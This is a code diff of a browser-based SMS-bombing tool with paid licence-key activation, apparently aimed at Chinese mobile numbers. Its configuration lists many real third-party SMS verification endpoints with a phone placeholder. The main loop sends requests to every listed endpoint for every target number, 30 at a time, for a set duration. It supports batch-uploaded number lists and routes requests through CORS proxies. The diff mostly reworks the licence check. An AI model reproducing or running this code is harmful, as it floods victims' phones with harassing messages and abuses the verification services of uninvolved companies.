@@ -36,14 +36,12 @@ body { background: #000; min-height: 100vh; display: flex; align-items: center; 
 .modal-box input:focus { border-color: #007aff; }
 .modal-box .btn-verify { width: 100%; padding: 12px; background: #007aff; border: none; border-radius: 8px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 10px; }
 .modal-box .btn-buy { width: 100%; padding: 12px; background: #12b7f5; border: none; border-radius: 8px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; }
-.modal-status { text-align: center; font-size: 13px; margin-bottom: 10px; min-height: 18px; color: #f44; }
+.modal-status { text-align: center; font-size: 13px; margin-bottom: 10px; min-height: 18px; color: #f44; white-space: pre-line; }
 .modal-status.ok { color: #0f0; }
 .free-box { background: linear-gradient(135deg, #1e3a1e 0%, #1e1e1e 100%); border: 1px solid #2e7d32; }
 .free-box h2 { font-size: 22px; color: #4caf50; margin-bottom: 8px; }
 .free-box .free-desc { color: #aaa; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
 .free-box .btn-ok { width: 100%; padding: 12px; background: #2e7d32; border: none; border-radius: 8px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; }
-
-/* 新增：上传号码区 */
 .upload-row { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
 .btn-upload { background: #2c6b2c; border: none; color: #fff; padding: 10px 16px; height: 40px; border-radius: 8px; font-size: 14px; cursor: pointer; white-space: nowrap; font-weight: 600; }
 .btn-upload:hover { background: #38853a; }
@@ -195,7 +193,6 @@ const CONFIG = {
     { url: "https://dq.xiaoduoai.com/api/user/sendSmsCode", method: "POST", bodyType: "json", bodyData: {phone: "[phone]", codeType: "login"}, header: {"Content-Type": "application/json"} },
     { url: "https://api.jianbing.link/api/member/auth/send-sms-code", method: "POST", bodyType: "json", bodyData: {mobile: "[phone]", scene: 1}, header: {"Content-Type": "application/json"} },
     { url: "https://my.61info.cn/api/member/auth/send-sms-code", method: "POST", bodyType: "json", bodyData: {mobile: "[phone]", scene: 1}, header: {"Content-Type": "application/json"} },
-    { url: "https://app.xingyaodaren.com/get-valid-code", method: "POST", bodyType: "json", bodyData: {nation: "86", accountNo: "[phone]"}, header: {"Content-Type": "application/json"} },
     { url: "https://www.icitycloud.com.cn/digicity/app/userinfo/icityuserlogin/sendmsgsecond.html", method: "POST", bodyType: "form", bodyData: {phone: "[phone]", type: "5", platform_type: "135"}, header: {} },
     { url: "https://api.shecarefertility.com/ThermometerV2/veri/getCodeV3", method: "POST", bodyType: "json", bodyData: {phoneNumber: "[phone]", type: 1}, header: {"Content-Type": "application/json"} },
     { url: "https://fast.hahapark.com/api/wanlshop/sms/send", method: "POST", bodyType: "json", bodyData: {mobile: "[phone]", event: "register"}, header: {"Content-Type": "application/json"} },
@@ -216,7 +213,6 @@ const CONFIG = {
 // ============================================================
 // 2. 通用工具
 // ============================================================
-const isHttps = location.protocol === 'https:';
 const CORS_PROXIES = [
   (u) => u,
   (u) => 'https://api.allorigins.win/raw?url=' + encodeURIComponent(u),
@@ -520,45 +516,70 @@ async function loadApisFromRemote() {
 }
 
 // ============================================================
-// 6. 卡密验证
+// 6. 卡密验证（采用你第一个文件的 POST 方式）
 // ============================================================
+// 生成机器码（基于 localStorage）
 function getOrCreateMac() {
-  let mac = localStorage.getItem('device_mac');
+  const storageKey = 'device_mac';
+  let mac = localStorage.getItem(storageKey);
   if (!mac) {
-    if (crypto.randomUUID) mac = crypto.randomUUID().replace(/-/g, '');
-    else {
-      const b = new Uint8Array(16);
-      crypto.getRandomValues(b);
-      mac = Array.from(b).map(x => x.toString(16).padStart(2, '0')).join('');
-    }
-    localStorage.setItem('device_mac', mac);
+    mac = generateMac();
+    localStorage.setItem(storageKey, mac);
   }
   return mac;
 }
+function generateMac() {
+  if (crypto.randomUUID) {
+    return crypto.randomUUID().replace(/-/g, '');
+  }
+  const bytes = new Uint8Array(16);
+  crypto.getRandomValues(bytes);
+  bytes[6] = (bytes[6] & 0x0f) | 0x40;
+  bytes[8] = (bytes[8] & 0x3f) | 0x80;
+  return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
+}
+
+// 带线路切换的验证（POST 提交，参照 4_5913481822636875511 文件）
 async function verifyCard(card) {
   const mac = getOrCreateMac();
-  const query = new URLSearchParams({ Softid: CONFIG.softid, Card: card, Version: CONFIG.version, Mac: mac }).toString();
-  let lastErr = '';
-  for (const base of CONFIG.apiUrls) {
-    const fullUrl = base + '&' + query;
+  const postData = new URLSearchParams({
+    Softid: CONFIG.softid,
+    Card: card,
+    Version: CONFIG.version,
+    Mac: mac
+  }).toString();
+
+  let lastError = '';
+
+  for (let i = 0; i < CONFIG.apiUrls.length; i++) {
+    const url = CONFIG.apiUrls[i];
     try {
-      let txt;
-      if (location.protocol === 'https:') {
-        const proxy = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(fullUrl);
-        const r = await fetchWithTimeout(proxy, {}, 10000);
-        if (!r.ok) throw new Error('代理 HTTP ' + r.status);
-        txt = await r.text();
+      console.log(`尝试线路 ${i + 1}: ${url}`);
+      const response = await fetchWithTimeout(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: postData
+      }, 12000);
+
+      if (!response.ok) throw new Error(`HTTP ${response.status}`);
+
+      const resultText = await response.text();
+      console.log(`线路 ${i + 1} 返回:`, resultText);
+
+      // 成功：返回 16 位字符串（Token）
+      if (resultText && resultText.trim().length === 16) {
+        return { success: true, message: '验证成功', token: resultText.trim() };
       } else {
-        const r = await fetchWithTimeout(fullUrl, {}, 10000);
-        if (!r.ok) throw new Error('HTTP ' + r.status);
-        txt = await r.text();
+        lastError = `接口返回: ${resultText}`;
+        console.warn(`线路 ${i + 1} 验证失败:`, resultText);
       }
-      const t = (txt || '').trim();
-      if (t && t.length === 16 && !/^[0-9]+$/.test(t)) return { success: true, message: '验证成功' };
-      lastErr = '接口返回: ' + t;
-    } catch (e) { lastErr = '网络错误: ' + e.message; }
+    } catch (error) {
+      lastError = `网络错误: ${error.message}`;
+      console.warn(`线路 ${i + 1} 请求失败:`, error);
+    }
   }
-  return { success: false, message: '所有线路均不可用: ' + lastErr };
+
+  return { success: false, message: `所有线路均不可用，最后错误: ${lastError}` };
 }
 
 // ============================================================
@@ -617,22 +638,34 @@ function showMainApp() {
   mainApp.style.display = 'block';
   appendLog('🔥 已加载接口 ' + apis.length + ' 个', '');
 }
+let verifying = false;
 async function handleVerify() {
+  if (verifying) return;
   const card = codeInput.value.trim();
   if (!card) { showMessage('请输入卡密', ''); return; }
+  verifying = true;
   verifyBtn.disabled = true;
   verifyBtn.textContent = '验证中...';
   showMessage('正在验证，请稍候...', '');
-  const r = await verifyCard(card);
-  if (r.success) {
-    showMessage('验证成功！', 'ok');
-    verifyBtn.textContent = '验证通过';
-    localStorage.setItem('saved_card', card);
-    setTimeout(showMainApp, 600);
-  } else {
-    showMessage(r.message, '');
+  try {
+    const r = await verifyCard(card);
+    if (r.success) {
+      showMessage('验证成功！\nToken: ' + r.token, 'ok');
+      verifyBtn.textContent = '验证通过';
+      localStorage.setItem('saved_card', card);
+      setTimeout(showMainApp, 600);
+    } else {
+      showMessage(r.message, '');
+      verifyBtn.textContent = '重新验证';
+      verifyBtn.disabled = false;
+      codeInput.focus();
+    }
+  } catch (e) {
+    showMessage('请求出错: ' + e.message, '');
     verifyBtn.textContent = '重新验证';
     verifyBtn.disabled = false;
+  } finally {
+    verifying = false;
   }
 }
 
@@ -679,7 +712,7 @@ document.getElementById('tgBtn').addEventListener('click', () => window.open('ht
 // ============================================================
 // 10. 上传 txt 批量号码
 // ============================================================
-var batchPhones = []; // 已加载的批量号码
+var batchPhones = [];
 
 document.getElementById('uploadBtn').addEventListener('click', () => {
   document.getElementById('fileInput').click();
@@ -697,7 +730,6 @@ document.getElementById('fileInput').addEventListener('change', function (e) {
     for (const line of lines) {
       const trimmed = line.trim();
       if (!trimmed) continue;
-      // 提取所有数字串
       const digits = trimmed.replace(/\D/g, '');
       if (digits.length === 11 && digits.startsWith('1')) {
         if (!seen.has(digits)) {
@@ -821,14 +853,8 @@ function sendRequest(api, phone) {
         }
       }
 
-      doFetch(url, options).then(r1 => {
-        if (r1.ok) {
-          resolve({ success: true, status: r1.status });
-          return;
-        }
-        doFetch(url, options).then(r2 => {
-          resolve({ success: r2.ok, status: r2.status });
-        });
+      doFetch(url, options).then(r => {
+        resolve({ success: r.ok, status: r.status });
       });
     } catch (e) {
       resolve({ success: false, status: -1 });
@@ -853,7 +879,7 @@ async function runConcurrent(tasks, concurrency) {
 }
 
 // ============================================================
-// 12. 轰炸主循环（支持批量号码）
+// 12. 轰炸主循环
 // ============================================================
 document.getElementById('sendBtn').addEventListener('click', async () => {
   const phoneInput = document.getElementById('phoneInput');
@@ -862,7 +888,6 @@ document.getElementById('sendBtn').addEventListener('click', async () => {
   const minutesInput = document.getElementById('minutesInput');
   const intervalInput = document.getElementById('intervalInput');
 
-  // 组装目标号码列表：优先使用批量号码，否则使用单个输入
   let phones = [];
   if (batchPhones && batchPhones.length > 0) {
     phones = batchPhones.slice();
@@ -902,14 +927,12 @@ document.getElementById('sendBtn').addEventListener('click', async () => {
   const endTime = startTime + minutes * 60 * 1000;
   let successTotal = 0, failTotal = 0, round = 0;
 
-  // 每个号码轮流轰炸，每轮构建 (phones × apis) 任务
   while (Date.now() < endTime) {
     round++;
     const remain = Math.max(0, Math.ceil((endTime - Date.now()) / 1000));
     const rM = Math.floor(remain / 60), rS = remain % 60;
     statusLabel.textContent = `⏳ 第 ${round} 轮 · 剩余 ${rM}分${rS}秒 · 成功 ${successTotal} 失败 ${failTotal}`;
 
-    // 构建本轮所有任务：每个号码 × 每个接口
     const tasks = [];
     for (const phone of phones) {
       for (const api of apis) {
@@ -917,7 +940,6 @@ document.getElementById('sendBtn').addEventListener('click', async () => {
       }
     }
 
-    // 并发 30 执行
     const results = await runConcurrent(tasks, 30);
 
     let roundOk = 0, roundFail = 0;
